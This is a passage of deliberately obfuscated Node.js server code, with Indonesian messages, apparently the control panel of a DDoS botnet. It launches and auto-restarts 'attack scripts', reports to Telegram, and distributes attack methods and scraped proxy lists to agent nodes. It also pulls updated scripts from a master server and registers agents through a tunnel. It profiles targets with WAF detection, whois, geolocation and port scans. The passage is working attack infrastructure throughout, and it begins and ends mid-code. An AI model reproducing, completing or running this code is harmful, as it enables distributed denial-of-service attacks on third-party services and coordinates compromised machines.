Promise[_0x4162f7(0x2f5)](_0x4a392e);return _0x27c5cd['json']({'master':{'processStats':_0x32fded,'serverResource':{'cpuUsagePercent':_0x156711,'usedMemoryMB':_0x1a30f5,'totalMemoryMB':_0x551042,'memoryUsagePercent':Math[_0x4162f7(0x28b)](0x64*_0x1a30f5/_0x551042),'uptimeSeconds':Math['floor'](process[_0x4162f7(0x324)]())}},'agentStats':_0x375268});}_0x27c5cd[_0x4162f7(0x1b0)]({'processStats':_0x32fded,'serverResource':{'cpuUsagePercent':_0x156711,'usedMemoryMB':_0x1a30f5,'totalMemoryMB':_0x551042,'memoryUsagePercent':Math['round'](0x64*_0x1a30f5/_0x551042),'uptimeSeconds':Math[_0x4162f7(0x1d6)](process[_0x4162f7(0x324)]())}});}),setInterval(async()=>{const _0x439c2c=_0x3567df;for(const [_0x23119c,_0x372649]of Object[_0x439c2c(0x2e9)](activeProcesses)){if(Date[_0x439c2c(0x23d)]()-_0x372649[_0x439c2c(0x209)]>0x7530&&_0x372649[_0x439c2c(0x273)]===_0x439c2c(0x32f)){_0x372649['ls'][_0x439c2c(0x20c)]('SIGKILL');const {scriptName:_0x13b875,args:_0x1e7e3e}=_0x372649,_0x2b079c=spawnAttackScript(_0x13b875,_0x1e7e3e,_0x23119c);activeProcesses[_0x23119c]={..._0x2b079c,'status':_0x439c2c(0x2e7),'lastResponse':Date['now'](),'restartCount':(_0x372649['restartCount']||0x0)+0x1,'scriptName':_0x13b875,'args':_0x1e7e3e},logActivity(_0x439c2c(0x2a0),{'processId':_0x23119c,'pid':_0x2b079c['ls'][_0x439c2c(0x203)]}),broadcastWS({'type':_0x439c2c(0x1a9),'processId':_0x23119c,'pid':_0x2b079c['ls'][_0x439c2c(0x203)]}),await sendTelegramPhoto(_0x439c2c(0x245)+(_0x439c2c(0x2ec)+escapeTelegram(_0x23119c)+'`\x0a')+(_0x439c2c(0x2a2)+_0x2b079c['ls'][_0x439c2c(0x203)]+'`'));}if([_0x439c2c(0x2ac),'crashed']['includes'](_0x372649['status'])&&(_0x372649[_0x439c2c(0x238)]||0x0)<0x3){const {scriptName:_0x546ca7,args:_0x877190}=_0x372649,_0x30a073=spawnAttackScript(_0x546ca7,_0x877190,_0x23119c);activeProcesses[_0x23119c]={..._0x30a073,'status':_0x439c2c(0x2e7),'lastResponse':Date[_0x439c2c(0x23d)](),'restartCount':(_0x372649['restartCount']||0x0)+0x1,'scriptName':_0x546ca7,'args':_0x877190},logActivity(_0x439c2c(0x1f5),{'processId':_0x23119c,'pid':_0x30a073['ls'][_0x439c2c(0x203)]}),broadcastWS({'type':'attack_restarted','processId':_0x23119c,'pid':_0x30a073['ls']['pid']}),await sendTelegramPhoto(_0x439c2c(0x296)+(_0x439c2c(0x2ec)+escapeTelegram(_0x23119c)+'`\x0a')+(_0x439c2c(0x2a2)+_0x30a073['ls']['pid']+'`'));}}},0x2710),app['get'](_0x3567df(0x2ee),(_0x48fb40,_0x5f1639)=>{const _0x56afa5=_0x3567df;if(_0x48fb40['query'][_0x56afa5(0x1f6)]!==apiKey)return _0x5f1639['status'](0x190)[_0x56afa5(0x1b6)]('API\x20key\x20tidak\x20valid');const _0x59fb86=readHistory();_0x5f1639[_0x56afa5(0x1b0)](_0x59fb86);}),app[_0x3567df(0x1fa)](_0x3567df(0x2a5),upload[_0x3567df(0x22b)]('file'),async(_0x192519,_0x43cf40)=>{const _0x2ddcee=_0x3567df,_0x1b750a=_0x192519[_0x2ddcee(0x2b4)][_0x2ddcee(0x1f6)]||_0x192519[_0x2ddcee(0x2bf)][_0x2ddcee(0x1f6)];if(_0x1b750a!==apiKey&&_0x1b750a!==AGENT_KEY)return _0x43cf40[_0x2ddcee(0x273)](0x190)[_0x2ddcee(0x1b6)]('API\x20key\x20tidak\x20valid');if(!_0x192519[_0x2ddcee(0x348)])return _0x43cf40['status'](0x190)[_0x2ddcee(0x1b6)]('Tidak\x20ada\x20file\x20ter-upload');const _0x34e02b=[_0x2ddcee(0x1a7),_0x2ddcee(0x1f4)],_0xbedf98=path[_0x2ddcee(0x2c6)](_0x192519['file'][_0x2ddcee(0x323)])['toLowerCase'](),_0x408524=path['join'](__dirname,_0x2ddcee(0x2ed),'method');if(!fs[_0x2ddcee(0x1ea)](_0x408524))fs[_0x2ddcee(0x30e)](_0x408524,{'recursive':!![]});let _0x5edb37=![];if(_0x34e02b[_0x2ddcee(0x331)](_0xbedf98)){const _0x5e255c=path['join'](_0x408524,_0x192519[_0x2ddcee(0x348)][_0x2ddcee(0x323)]);fs[_0x2ddcee(0x316)](_0x192519[_0x2ddcee(0x348)][_0x2ddcee(0x32d)],_0x5e255c),_0x5edb37=!![],logActivity(_0x2ddcee(0x2d8),{'file':_0x192519[_0x2ddcee(0x348)][_0x2ddcee(0x323)],'size':_0x192519[_0x2ddcee(0x348)][_0x2ddcee(0x291)]});}else _0x5edb37=![],logActivity(_0x2ddcee(0x2f0),{'file':_0x192519[_0x2ddcee(0x348)][_0x2ddcee(0x323)],'size':_0x192519[_0x2ddcee(0x348)][_0x2ddcee(0x291)]});let _0x592495=null;if(NODE_TYPE===_0x2ddcee(0x2dc))try{const {data:_0x510f65}=await axios['get'](MASTER_URL+_0x2ddcee(0x309),{'params':{'key':AGENT_KEY},'timeout':0x2710});fs[_0x2ddcee(0x29a)](methodsPath,JSON[_0x2ddcee(0x321)](_0x510f65,null,0x2)),_0x592495={'success':!![],'source':MASTER_URL,'methodsCount':Object['keys'](_0x510f65)['length']},logActivity('AUTO_SYNC_METHODS_JSON',{'from':MASTER_URL,'size':Object[_0x2ddcee(0x1dd)](_0x510f65)[_0x2ddcee(0x1e7)]});}catch(_0x30bb12){_0x592495={'success':![],'error':_0x30bb12[_0x2ddcee(0x1b2)],'source':MASTER_URL},logActivity('AUTO_SYNC_METHODS_JSON_FAIL',{'from':MASTER_URL,'error':_0x30bb12['message']});}_0x43cf40['json']({'message':_0x2ddcee(0x223),'file':_0x192519['file'][_0x2ddcee(0x323)],'moved':_0x5edb37,'mode':NODE_TYPE,'sync':_0x592495});}),app[_0x3567df(0x1fa)]('/api/agent/update',upload[_0x3567df(0x22b)](_0x3567df(0x348)),async(_0x1fac1e,_0x5db337)=>{const _0x415dc3=_0x3567df,_0x2bddf5=_0x1fac1e['query'][_0x415dc3(0x1f6)]||_0x1fac1e[_0x415dc3(0x2bf)][_0x415dc3(0x1f6)];if(_0x2bddf5!==apiKey)return _0x5db337[_0x415dc3(0x273)](0x190)[_0x415dc3(0x1b6)](_0x415dc3(0x261));if(!_0x1fac1e['file'])return _0x5db337[_0x415dc3(0x273)](0x190)[_0x415dc3(0x1b6)](_0x415dc3(0x25e));const _0x3d2b56=await Promise[_0x415dc3(0x2f5)](AGENT_LIST[_0x415dc3(0x27c)](_0x3d6f3a=>{const _0x298664=_0x415dc3,_0x10a2c0=new FormData();return _0x10a2c0[_0x298664(0x29b)](_0x298664(0x1f6),AGENT_KEY),_0x10a2c0[_0x298664(0x29b)]('file',fs[_0x298664(0x21d)](_0x1fac1e[_0x298664(0x348)]['path']),_0x1fac1e[_0x298664(0x348)][_0x298664(0x323)]),axios['post'](_0x3d6f3a[_0x298664(0x25b)]+'/api/update',_0x10a2c0,{'headers':_0x10a2c0['getHeaders'](),'timeout':0x2710})[_0x298664(0x27b)](_0x423418=>({'agent':_0x3d6f3a,'status':_0x298664(0x2e0),'data':_0x423418[_0x298664(0x271)]}))['catch'](_0x1592d5=>({'agent':_0x3d6f3a,'status':_0x298664(0x1f1),'error':_0x1592d5[_0x298664(0x1b2)]}));}));logActivity(_0x415dc3(0x1e9),{'file':_0x1fac1e['file']['filename'],'results':_0x3d2b56}),broadcastWS({'type':_0x415dc3(0x249),'results':_0x3d2b56,'file':_0x1fac1e['file'][_0x415dc3(0x201)]}),_0x5db337[_0x415dc3(0x1b0)]({'message':_0x415dc3(0x2ff),'results':_0x3d2b56});}),app[_0x3567df(0x2e4)](_0x3567df(0x27f),(_0x20e0ce,_0x6c716f)=>{const _0x338e54=_0x3567df;_0x6c716f[_0x338e54(0x1b0)]({'status':_0x338e54(0x24e),'uptime':process[_0x338e54(0x324)](),'cpu':os[_0x338e54(0x301)]()[0x0],'memory':Math['round'](process[_0x338e54(0x217)]()[_0x338e54(0x210)]/0x400/0x400),'totalMemory':Math[_0x338e54(0x28b)](os[_0x338e54(0x311)]()/0x400/0x400),'hostname':os['hostname']()});}),app[_0x3567df(0x2e4)](_0x3567df(0x206),async(_0x30c674,_0x533cce)=>{const _0x376cfb=_0x3567df,_0x3aeda2=_0x30c674[_0x376cfb(0x2b4)][_0x376cfb(0x1f6)];if(_0x3aeda2!==apiKey)return _0x533cce['status'](0x193)['json']({'message':'Invalid\x20API\x20key'});const _0x4f105e=[];for(const _0x5a9ba4 of agents){if(!_0x5a9ba4[_0x376cfb(0x212)])continue;try{const _0x3f94be=Date[_0x376cfb(0x23d)](),_0x37948b=await axios[_0x376cfb(0x2e4)](_0x5a9ba4[_0x376cfb(0x25b)]+'/api/health'),_0x34b40b=Date[_0x376cfb(0x23d)]()-_0x3f94be;_0x4f105e['push']({'agent':_0x5a9ba4,'status':_0x376cfb(0x2e0),'data':{..._0x37948b[_0x376cfb(0x271)],'ping':_0x34b40b}});}catch(_0x2b3de5){_0x4f105e[_0x376cfb(0x342)]({'agent':_0x5a9ba4,'status':'error','error':_0x2b3de5[_0x376cfb(0x1b2)]}),_0x5a9ba4[_0x376cfb(0x212)]=![],logActivity(_0x376cfb(0x2c4),{'agent':_0x5a9ba4}),saveAgents();}}_0x533cce[_0x376cfb(0x1b0)](_0x4f105e),broadcastWS({'type':_0x376cfb(0x239),'agents':_0x4f105e});}),setInterval(async()=>{const _0x56b3ab=_0x3567df;loadAgents();for(const _0xcfab21 of AGENT_LIST){try{await axios[_0x56b3ab(0x2e4)](_0xcfab21[_0x56b3ab(0x25b)]+_0x56b3ab(0x27f),{'timeout':0x1388}),!_0xcfab21[_0x56b3ab(0x212)]&&(_0xcfab21[_0x56b3ab(0x212)]=!![],logActivity(_0x56b3ab(0x1ad),{'agent':_0xcfab21}),saveAgents(),broadcastWS({'type':'agent_status_update','agent':_0xcfab21}));}catch(_0x3aefdd){_0xcfab21[_0x56b3ab(0x212)]&&(_0xcfab21[_0x56b3ab(0x212)]=![],logActivity(_0x56b3ab(0x2c4),{'agent':_0xcfab21}),saveAgents(),broadcastWS({'type':_0x56b3ab(0x2c0),'agent':_0xcfab21}));}}},0x2710),app[_0x3567df(0x2e4)]('/api/hostcheck',async(_0xde3082,_0x2a7956)=>{const _0x5a772d=_0x3567df,_0x1301f6=_0xde3082['query'][_0x5a772d(0x1f6)],_0x225b7b=_0xde3082[_0x5a772d(0x2b4)][_0x5a772d(0x285)];if(_0x1301f6!==apiKey)return _0x2a7956[_0x5a772d(0x273)](0x193)['send']('API\x20key\x20tidak\x20valid');if(!_0x225b7b)return _0x2a7956[_0x5a772d(0x273)](0x190)[_0x5a772d(0x1b6)](_0x5a772d(0x1f3));try{let _0x1cd2c0=_0x225b7b;if(!/^https?:\/\//i[_0x5a772d(0x2db)](_0x225b7b))_0x1cd2c0=_0x5a772d(0x262)+_0x225b7b;const _0x3b4552=new URL(_0x1cd2c0),_0x2dc0af=_0x3b4552[_0x5a772d(0x1e3)];let _0x1a67c8='';try{const _0x258c72=await dns[_0x5a772d(0x308)](_0x2dc0af);_0x1a67c8=_0x258c72[_0x5a772d(0x205)];}catch(_0x28031b){_0x1a67c8=_0x2dc0af;}let _0x5a364b=![],_0x97f414=null,_0x490e45=null;try{const _0x5248bc=Date['now'](),_0x288400=new AbortController(),_0x56c319=setTimeout(()=>_0x288400['abort'](),0x1388),_0x206b37=await fetch(_0x1cd2c0,{'signal':_0x288400['signal']});clearTimeout(_0x56c319),_0x97f414=Date[_0x5a772d(0x23d)]()-_0x5248bc,_0x206b37['ok']||_0x206b37[_0x5a772d(0x273)]>=0xc8&&_0x206b37['status']<0x1f4?_0x5a364b=!![]:_0x490e45=_0x206b37[_0x5a772d(0x273)];}catch(_0x5f3d5b){_0x5a364b=![],_0x490e45=_0x5f3d5b[_0x5a772d(0x21b)]===_0x5a772d(0x31b)?_0x5a772d(0x255):_0x5f3d5b['code']||_0x5f3d5b[_0x5a772d(0x1b2)]||_0x5a772d(0x248);}const _0x106c7e=await fetch(_0x5a772d(0x270)+_0x1a67c8),_0xdea24f=await _0x106c7e[_0x5a772d(0x1b0)]();return _0x2a7956[_0x5a772d(0x1b0)]({'status':_0x5a364b?_0x5a772d(0x24e):_0x5a772d(0x318),'latency':_0x97f414,'errorCode':_0x5a364b?null:_0x490e45,'ip':_0xdea24f['ip']||_0x1a67c8,'asn':_0xdea24f[_0x5a772d(0x299)]?.['asn']||null,'org':_0xdea24f[_0x5a772d(0x299)]?.[_0x5a772d(0x33b)]||null,'isp':_0xdea24f[_0x5a772d(0x299)]?.[_0x5a772d(0x292)]||null,'country':_0xdea24f[_0x5a772d(0x1be)]||null,'region':_0xdea24f['region']||null,'city':_0xdea24f[_0x5a772d(0x2c9)]||null,'latitude':_0xdea24f['latitude']||null,'longitude':_0xdea24f[_0x5a772d(0x1fb)]||null});}catch(_0x4b8e45){return _0x2a7956[_0x5a772d(0x273)](0x1f4)[_0x5a772d(0x1b0)]({'error':'Gagal\x20memeriksa\x20host','detail':_0x4b8e45['message']});}}),app['get'](_0x3567df(0x1f7),async(_0x255efe,_0x49e59b)=>{const _0x58fcdf=_0x3567df,_0x2aa17f=_0x255efe[_0x58fcdf(0x2b4)][_0x58fcdf(0x1f6)],_0x1aef81=_0x255efe['query'][_0x58fcdf(0x30d)];if(_0x2aa17f!==apiKey)return _0x49e59b[_0x58fcdf(0x273)](0x193)[_0x58fcdf(0x1b6)](_0x58fcdf(0x261));if(!_0x1aef81)return _0x49e59b[_0x58fcdf(0x273)](0x190)[_0x58fcdf(0x1b6)](_0x58fcdf(0x336));try{const _0x5c1f4a={'target':_0x1aef81,'urlInfo':{},'dnsInfo':{},'wafDetection':null,'whois':{},'geo':{},'openPorts':[],'error':null},_0x5df1da=/^https?:\/\//['test'](_0x1aef81)?_0x1aef81:'http://'+_0x1aef81,_0x3bd936=new URL(_0x5df1da),_0x1fb44c=_0x3bd936[_0x58fcdf(0x1e3)];try{const _0x42d51f=await dns[_0x58fcdf(0x308)](_0x1fb44c);_0x5c1f4a['dnsInfo']['ip']=_0x42d51f['address'];}catch(_0x1ed851){_0x5c1f4a[_0x58fcdf(0x320)]['ip']=null;}try{const _0x150e05=await fetch(_0x5df1da,{'method':_0x58fcdf(0x1b9),'timeout':0x1388}),_0x9c8135={};_0x150e05[_0x58fcdf(0x2c8)]['forEach']((_0x41dcd1,_0x1b1b5d)=>_0x9c8135[_0x1b1b5d]=_0x41dcd1),_0x5c1f4a[_0x58fcdf(0x278)][_0x58fcdf(0x2c8)]=_0x9c8135,_0x5c1f4a[_0x58fcdf(0x278)][_0x58fcdf(0x273)]=_0x150e05['status'],_0x5c1f4a[_0x58fcdf(0x278)][_0x58fcdf(0x21a)]=_0x9c8135['server']||null,_0x5c1f4a[_0x58fcdf(0x278)][_0x58fcdf(0x1a6)]=_0x9c8135[_0x58fcdf(0x32b)]||null;if(_0x9c8135[_0x58fcdf(0x21a)]?.[_0x58fcdf(0x2c2)]()[_0x58fcdf(0x331)]('cloudflare')||_0x9c8135[_0x58fcdf(0x2d0)])_0x5c1f4a[_0x58fcdf(0x26a)]=_0x58fcdf(0x227);else{if(_0x9c8135['x-sucuri-id'])_0x5c1f4a[_0x58fcdf(0x26a)]='Sucuri';else{if(_0x9c8135[_0x58fcdf(0x317)])_0x5c1f4a['wafDetection']='Akamai';else _0x9c8135[_0x58fcdf(0x20a)]&&(_0x5c1f4a[_0x58fcdf(0x26a)]=_0x58fcdf(0x1b7)+_0x9c8135['x-cdn']);}}}catch(_0x66ac1b){_0x5c1f4a['urlInfo'][_0x58fcdf(0x2d5)]=_0x58fcdf(0x28e)+_0x66ac1b[_0x58fcdf(0x1b2)];}try{const _0x5bfb38=await whois(_0x1fb44c);_0x5c1f4a[_0x58fcdf(0x1ff)]={'asn':_0x5bfb38[_0x58fcdf(0x2c1)]||_0x5bfb38[_0x58fcdf(0x332)]||null,'org':_0x5bfb38[_0x58fcdf(0x33b)]||_0x5bfb38[_0x58fcdf(0x1cd)]||null,'country':_0x5bfb38[_0x58fcdf(0x1be)]||_0x5bfb38[_0x58fcdf(0x24a)]||null};}catch(_0x169d5a){_0x5c1f4a[_0x58fcdf(0x1ff)]={'error':_0x169d5a['message']};}try{if(_0x5c1f4a[_0x58fcdf(0x320)]['ip']){const _0x3dcfd6=await fetch(_0x58fcdf(0x270)+_0x5c1f4a[_0x58fcdf(0x320)]['ip']),_0x37eeaa=await _0x3dcfd6[_0x58fcdf(0x1b0)]();_0x5c1f4a['geo']={'asn':_0x37eeaa[_0x58fcdf(0x299)]?.[_0x58fcdf(0x2c1)],'org':_0x37eeaa[_0x58fcdf(0x299)]?.[_0x58fcdf(0x33b)],'isp':_0x37eeaa['connection']?.[_0x58fcdf(0x292)],'country':_0x37eeaa[_0x58fcdf(0x1be)],'city':_0x37eeaa[_0x58fcdf(0x2c9)],'region':_0x37eeaa[_0x58fcdf(0x1dc)]};}}catch(_0x573959){_0x5c1f4a['geo']={'error':_0x573959['message']};}if(_0x5c1f4a[_0x58fcdf(0x320)]['ip'])try{_0x5c1f4a[_0x58fcdf(0x1c9)]=await scanCommonPorts(_0x5c1f4a[_0x58fcdf(0x320)]['ip']);}catch(_0x4afc10){_0x5c1f4a[_0x58fcdf(0x2af)]=_0x4afc10['message'];}_0x49e59b['json'](_0x5c1f4a);}catch(_0x1e39ab){_0x49e59b[_0x58fcdf(0x273)](0x1f4)[_0x58fcdf(0x1b0)]({'error':_0x58fcdf(0x307),'detail':_0x1e39ab[_0x58fcdf(0x1b2)]});}});const SCRAPE_SOURCES=[{'url':_0x3567df(0x325),'proto':_0x3567df(0x1ca)},{'url':_0x3567df(0x314),'proto':_0x3567df(0x26b)},{'url':_0x3567df(0x1c6),'proto':_0x3567df(0x319)},{'url':'https://www.proxy-list.download/api/v1/get?type=http','proto':_0x3567df(0x1ca)},{'url':_0x3567df(0x2ef),'proto':_0x3567df(0x26b)},{'url':'https://www.proxy-list.download/api/v1/get?type=socks5','proto':_0x3567df(0x319)},{'url':_0x3567df(0x264),'proto':_0x3567df(0x282)}];function parseProxyLine(_0x436243){const _0x538902=_0x3567df;_0x436243=_0x436243[_0x538902(0x22e)]();if(/^\d{1,3}(\.\d{1,3}){3}:\d+/[_0x538902(0x2db)](_0x436243))return _0x436243[_0x538902(0x1bd)](/\s/)[0x0];return null;}async function scrapeProxy({protocols:protocols=[_0x3567df(0x1ca),_0x3567df(0x26b),_0x3567df(0x319)],country:country='ALL'}={}){const _0x23b7b8=_0x3567df,_0x514bfc=require('axios');let _0xbe7baa=[],_0x37a615={'total':0x0,'byProto':{},'byCountry':{}};for(const _0x2075f4 of SCRAPE_SOURCES){if(_0x2075f4[_0x23b7b8(0x303)]!=='mix'&&!protocols['includes'](_0x2075f4['proto']))continue;try{const _0x2be9ea=await _0x514bfc[_0x23b7b8(0x2e4)](_0x2075f4[_0x23b7b8(0x25b)],{'timeout':0x3a98});let _0x75e280=_0x2be9ea[_0x23b7b8(0x271)][_0x23b7b8(0x1bd)]('\x0a')[_0x23b7b8(0x27c)](_0x4ae07c=>_0x4ae07c['trim']())['filter'](Boolean);_0x2075f4['url']['includes'](_0x23b7b8(0x269))&&(_0x75e280=_0x75e280[_0x23b7b8(0x33e)](_0x159199=>/^\d{1,3}(\.\d{1,3}){3}:\d+/[_0x23b7b8(0x2db)](_0x159199)));let _0x2ce0d4=_0x75e280[_0x23b7b8(0x27c)](_0x4f6f3a=>parseProxyLine(_0x4f6f3a))['filter'](Boolean);_0x2075f4[_0x23b7b8(0x303)]!==_0x23b7b8(0x282)?_0x37a615[_0x23b7b8(0x1e4)][_0x2075f4[_0x23b7b8(0x303)]]=(_0x37a615[_0x23b7b8(0x1e4)][_0x2075f4[_0x23b7b8(0x303)]]||0x0)+_0x2ce0d4[_0x23b7b8(0x1e7)]:_0x37a615[_0x23b7b8(0x1e4)][_0x23b7b8(0x282)]=(_0x37a615[_0x23b7b8(0x1e4)][_0x23b7b8(0x282)]||0x0)+_0x2ce0d4[_0x23b7b8(0x1e7)],_0xbe7baa=_0xbe7baa[_0x23b7b8(0x26e)](_0x2ce0d4);}catch(_0x4c44bb){if(typeof logActivity===_0x23b7b8(0x294))logActivity(_0x23b7b8(0x33a),{'url':_0x2075f4[_0x23b7b8(0x25b)],'error':_0x4c44bb[_0x23b7b8(0x1b2)]});}}_0xbe7baa=Array[_0x23b7b8(0x2d2)](new Set(_0xbe7baa)),_0x37a615[_0x23b7b8(0x2e2)]=_0xbe7baa[_0x23b7b8(0x1e7)];const _0x4a9068=path[_0x23b7b8(0x2d6)](__dirname,_0x23b7b8(0x225));fs[_0x23b7b8(0x29a)](_0x4a9068,_0xbe7baa[_0x23b7b8(0x2d6)]('\x0a'),'utf8');if(typeof logActivity===_0x23b7b8(0x294))logActivity(_0x23b7b8(0x219),{'total':_0xbe7baa[_0x23b7b8(0x1e7)],'protocols':protocols,'country':country});return{'proxies':_0xbe7baa,'stats':_0x37a615};}app['get'](_0x3567df(0x2e1),async(_0x121b17,_0x2b18b0)=>{const _0x262892=_0x3567df,_0x3b93da=_0x121b17['query'][_0x262892(0x1f6)],_0x10dcd1=(_0x121b17[_0x262892(0x2b4)][_0x262892(0x300)]||_0x262892(0x343))[_0x262892(0x1bd)](',')[_0x262892(0x27c)](_0x20d62d=>_0x20d62d['trim']()['toLowerCase']())['filter'](Boolean),_0x4f508a=_0x121b17[_0x262892(0x2b4)][_0x262892(0x1be)]||_0x262892(0x287);if(_0x3b93da!==apiKey)return _0x2b18b0[_0x262892(0x273)](0x193)[_0x262892(0x1b0)]({'message':_0x262892(0x261)});try{const {proxies:_0x487d53,stats:_0x3d0782}=await scrapeProxy({'protocols':_0x10dcd1,'country':_0x4f508a});_0x2b18b0[_0x262892(0x1b0)]({'message':_0x262892(0x246),'total':_0x3d0782['total'],'byProto':_0x3d0782['byProto'],'example':_0x487d53[_0x262892(0x2b9)](0x0,0x5)});}catch(_0x3be8dd){_0x2b18b0[_0x262892(0x273)](0x1f4)['json']({'error':_0x3be8dd['message']||_0x3be8dd[_0x262892(0x1c1)]()});}}),app[_0x3567df(0x1fa)](_0x3567df(0x297),upload[_0x3567df(0x22b)](_0x3567df(0x348)),(_0x2ca03e,_0x24847d)=>{const _0x539361=_0x3567df,_0x57ed21=_0x2ca03e['query'][_0x539361(0x1f6)]||_0x2ca03e[_0x539361(0x2bf)]['key'];if(_0x57ed21!==apiKey&&_0x57ed21!==AGENT_KEY)return _0x24847d[_0x539361(0x273)](0x190)[_0x539361(0x1b6)](_0x539361(0x261));if(!_0x2ca03e[_0x539361(0x348)])return _0x24847d['status'](0x190)['send'](_0x539361(0x30f));const _0x23a912=path['join'](__dirname,_0x539361(0x225));fs[_0x539361(0x316)](_0x2ca03e[_0x539361(0x348)]['path'],_0x23a912);if(typeof logActivity==='function')logActivity('RECEIVE_PROXY_UPDATE',{'size':_0x2ca03e[_0x539361(0x348)][_0x539361(0x291)]});_0x24847d[_0x539361(0x1b0)]({'message':_0x539361(0x2a6),'size':_0x2ca03e[_0x539361(0x348)][_0x539361(0x291)]});});async function getPublicIp(){const _0x2ee93b=_0x3567df;try{const {data:_0x2136fc}=await axios[_0x2ee93b(0x2e4)](_0x2ee93b(0x298),{'timeout':0x1388});return _0x2136fc['ip'];}catch(_0x1fce2f){return logActivity('GET_PUBLIC_IP_FAIL',{'error':_0x1fce2f[_0x2ee93b(0x1b2)]}),_0x2ee93b(0x31c);}}async function autoRegisterToMaster(){const _0x337395=_0x3567df;if(NODE_TYPE!==_0x337395(0x2dc))return;let _0x580742='',_0x5084a3=localTunnelUrl;if(!_0x5084a3){const _0x2eb650=await getPublicIp();_0x5084a3='http://'+_0x2eb650+':'+port;}try{const {data:_0x5f4b7a}=await axios[_0x337395(0x2e4)](MASTER_URL+_0x337395(0x2c3),{'params':{'key':AGENT_KEY},'timeout':0x2710});let _0x4d5129=0x1;const _0x3fa380=0x32;let _0x48459d=new Set((_0x5f4b7a||[])[_0x337395(0x27c)](_0x1ba601=>_0x1ba601['name']));for(;_0x4d5129<=_0x3fa380;_0x4d5129++){if(!_0x48459d['has'](_0x337395(0x310)+_0x4d5129))break;}_0x580742=_0x337395(0x310)+_0x4d5129;}catch(_0x2c620b){_0x580742='srv1';}try{const {data:_0x5da828}=await axios['post'](MASTER_URL+_0x337395(0x211),{'name':_0x580742,'url':_0x5084a3,'agentKey':AGENT_KEY},{'timeout':0x2710});logActivity(_0x337395(0x26c),{'result':_0x5da828,'agentName':_0x580742,'agentUrl':_0x5084a3});}catch(_0x4c8a5f){logActivity(_0x337395(0x334),{'error':_0x4c8a5f['message'],'agentName':_0x580742,'agentUrl':_0x5084a3});}}async function startLocalTunnel(_0x1ebdff=0xa){const _0x212a41=_0x3567df,_0xc9d1d3=require(_0x212a41(0x2d1));let _0x3cfb4b=null;for(let _0x4fd649=0x1;_0x4fd649<=_0x1ebdff;_0x4fd649++){try{_0x3cfb4b=await _0xc9d1d3({'port':port});if(_0x3cfb4b[_0x212a41(0x25b)])return localTunnelUrl=_0x3cfb4b[_0x212a41(0x25b)],console[_0x212a41(0x23a)](_0x212a41(0x328),'Agent\x20URL\x20via\x20LocalTunnel:',_0x3cfb4b[_0x212a41(0x25b)]),_0x3cfb4b['on']('close',()=>{const _0x305d3d=_0x212a41;console[_0x305d3d(0x23a)](_0x305d3d(0x2b2)),localTunnelUrl=null;}),_0x3cfb4b;else throw new Error(_0x212a41(0x1ae));}catch(_0x305ccd){console[_0x212a41(0x2d5)](_0x212a41(0x21f)+_0x4fd649+'):',_0x305ccd[_0x212a41(0x1b2)]),_0x4fd649===_0x1ebdff?console['error'](_0x212a41(0x329),_0x212a41(0x30b)):await new Promise(_0x3fe42e=>setTimeout(_0x3fe42e,0xbb8));}}return null;}async function autoSyncFromMaster(){const _0x3dd887=_0x3567df;if(NODE_TYPE!=='agent')return;try{const {data:_0x3b59b1}=await axios[_0x3dd887(0x2e4)](MASTER_URL+'/api/methods',{'params':{'key':AGENT_KEY},'timeout':0x2710});fs[_0x3dd887(0x29a)](methodsPath,JSON['stringify'](_0x3b59b1,null,0x2)),logActivity(_0x3dd887(0x207),{'from':MASTER_URL,'size':Object[_0x3dd887(0x1dd)](_0x3b59b1)[_0x3dd887(0x1e7)]});const _0x10adf7=new Set(Object[_0x3dd887(0x346)](_0x3b59b1)[_0x3dd887(0x27c)](_0xce5754=>_0xce5754[_0x3dd887(0x34b)])[_0x3dd887(0x33e)](Boolean)),_0x4490b1=path[_0x3dd887(0x2d6)](__dirname,_0x3dd887(0x2ed),_0x3dd887(0x2b8));if(!fs[_0x3dd887(0x1ea)](_0x4490b1))fs[_0x3dd887(0x30e)](_0x4490b1,{'recursive':!![]});const _0x12e9eb=fs['readdirSync'](_0x4490b1)[_0x3dd887(0x33e)](_0x548c1f=>_0x548c1f[_0x3dd887(0x33f)]('.js')||_0x548c1f[_0x3dd887(0x33f)](_0x3dd887(0x1f4)));for(const _0x507326 of _0x12e9eb){if(!_0x10adf7['has'](_0x507326))try{fs[_0x3dd887(0x274)](path[_0x3dd887(0x2d6)](_0x4490b1,_0x507326)),logActivity('AUTO_MIRROR_REMOVE_FILE',{'file':_0x507326});}catch(_0x2b2775){logActivity('AUTO_MIRROR_REMOVE_FAIL',{'file':_0x507326,'error':_0x2b2775['message']});}}for(const _0x59c8ba of _0x10adf7){const _0x27e330=path[_0x3dd887(0x2d6)](_0x4490b1,_0x59c8ba);if(!fs[_0x3dd887(0x1ea)](_0x27e330))try{const _0x3813b7=MASTER_URL+'/lib/method/'+encodeURIComponent(_0x59c8ba),_0x21ba63=await axios[_0x3dd887(0x2e4)](_0x3813b7,{'responseType':_0x3dd887(0x31f),'timeout':0x2710}),_0x1fd529=fs['createWriteStream'](_0x27e330);await new Promise((_0x5a8206,_0x59b3d5)=>{const _0x5ceffb=_0x3dd887;_0x21ba63['data'][_0x5ceffb(0x315)](_0x1fd529),_0x1fd529['on']('finish',_0x5a8206),_0x1fd529['on']('error',_0x59b3d5);}),logActivity(_0x3dd887(0x279),{'scriptName':_0x59c8ba});}catch(_0x3a0e9e){logActivity('AUTO_SYNC_METHOD_FILE_FAIL',{'scriptName':_0x59c8ba,'error':_0x3a0e9e[_0x3dd887(0x1b2)]});}}try{const _0x2a91fb=MASTER_URL+_0x3dd887(0x2e5),_0x18846c=path['join'](__dirname,_0x3dd887(0x225)),_0x5b1940=await axios[_0x3dd887(0x2e4)](_0x2a91fb,{'responseType':_0x3dd887(0x31f),'timeout':0x2710}),_0x668eda=fs[_0x3dd887(0x1d7)](_0x18846c);await new Promise((_0x5ebf29,_0x6c1e69)=>{const _0x2c9ee4=_0x3dd887;_0x5b1940[_0x2c9ee4(0x271)]['pipe'](_0x668eda),_0x668eda['on']('finish',_0x5ebf29),_0x668eda['on'](_0x2c9ee4(0x2d5),_0x6c1e69);}),logActivity(_0x3dd887(0x213),{'from':MASTER_URL});}catch(_0x20c3a5){logActivity(_0x3dd887(0x280),{'from':MASTER_URL,'error':_0x20c3a5[_0x3dd887(0x1b2)]});}}catch(_0x20a39e){logActivity('AUTO_SYNC_METHODS_JSON_FAIL',{'from':MASTER_URL,'error':_0x20a39e[_0x3dd887(0x1b2)]});}}if(NODE_TYPE===_0x3567df(0x2dc)){async function initAgent(){await startLocalTunnel(0xa),await 